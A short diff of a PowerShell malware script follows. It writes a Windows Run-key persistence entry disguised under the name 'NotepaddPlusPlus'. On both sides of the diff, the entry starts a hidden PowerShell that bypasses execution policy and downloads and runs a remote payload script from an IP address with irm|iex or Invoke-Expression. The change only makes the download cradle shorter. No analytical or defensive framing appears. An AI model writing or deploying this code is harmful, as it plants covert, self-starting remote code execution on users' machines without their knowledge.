@@ -66,7 +66,7 @@ $runKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
 # Use call operator (&) and proper escaping for reliability
 # This ensures PowerShell runs hidden and downloads/executes the payload
 try{
-    New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"powershell -exec bypass -WindowStyle Hidden -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://192.168.1.102:8080/lay-eggs.ps1')`"" -PropertyType String -Force
+    New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"powershell.exe -exec bypass -nop -w hidden -command 'irm http://192.168.1.102:8080/lay-eggs.ps1 | iex'`"" -PropertyType String -Force
 } catch {
     Log-Msg "Failed to set Run key: $_"
 }
